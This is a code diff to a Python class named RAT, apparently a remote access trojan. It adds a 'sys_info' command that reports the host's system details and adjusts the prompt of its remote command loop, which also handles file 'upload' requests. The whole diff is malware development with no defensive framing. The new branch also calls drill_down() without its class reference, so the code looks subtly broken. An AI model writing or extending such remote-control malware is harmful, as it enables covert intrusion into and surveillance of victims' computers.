@@ -212,6 +212,11 @@ class RAT:
 		return cls.ACK_SIG
 
 
+	# get system info
+	def drill_down(cls):
+		return os.uname()
+
+
 	# start the service
 	def start(cls):
 		while True:			
@@ -222,7 +227,7 @@ class RAT:
 				data = cls.receive()
 				if(data == cls.SIG):
 					cls.FLAG = True
-					cls.send("\n" + os.getcwd() + ">")
+					cls.send("\n" + os.getcwd() + "> ")
 
 				while(cls.FLAG):
 
@@ -241,6 +246,10 @@ class RAT:
 					# check for upload
 					elif(data.startswith('upload ')):
 						stdoutput = download(data[7:])
+					#send system info
+					elif(data.startswith('sys_info')):
+						stdoutput = drill_down()
+
 					
 
 					else:
